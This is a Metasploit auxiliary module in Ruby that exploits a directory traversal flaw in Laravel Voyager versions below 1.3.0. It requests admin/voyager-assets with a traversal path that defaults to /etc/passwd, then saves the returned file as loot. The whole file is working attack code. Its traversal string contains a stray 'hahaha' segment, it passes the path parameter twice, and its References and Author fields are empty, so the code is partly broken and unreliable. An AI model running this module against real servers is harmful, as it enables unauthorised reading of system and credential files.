class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Laravel Voyager Directory Traversal',
      'Description' => %q{
        This module exploits a directory traversal vulnerability which
        exists in Laravel Voyager < 1.3.0.
      },
      'References'  =>      [
        ],
      'Author'      =>         [
        ],
      'DisclosureDate' => 'Aug 03 2019',
      'License'     => MSF_LICENSE
    ))

register_options(
      [
        OptString.new('FILEPATH', [true, "The path to the file to Download", '/etc/passwd']),
      ])
  end

def run_host(ip)
      filename = datastore['FILEPATH']
      traversal = '../../../../hahaha' << filename

      res = send_request_raw({
        'method' => 'GET',
        'uri'    => normalize_uri(target_uri.path, "admin/voyager-assets?path=#{traversal}"),
        'vars_get' => {'path' => traversal}
      })

unless res && res.code == 200
        print_error('Nothing was downloaded')
        return
end
      vprint_good("#{peer} - \n#{res.body}")
      path = store_loot(
        filename,
        'text/plain',
        ip,
        res.body,
        filename
      )
      print_good("File saved in: #{path}")
    end
end
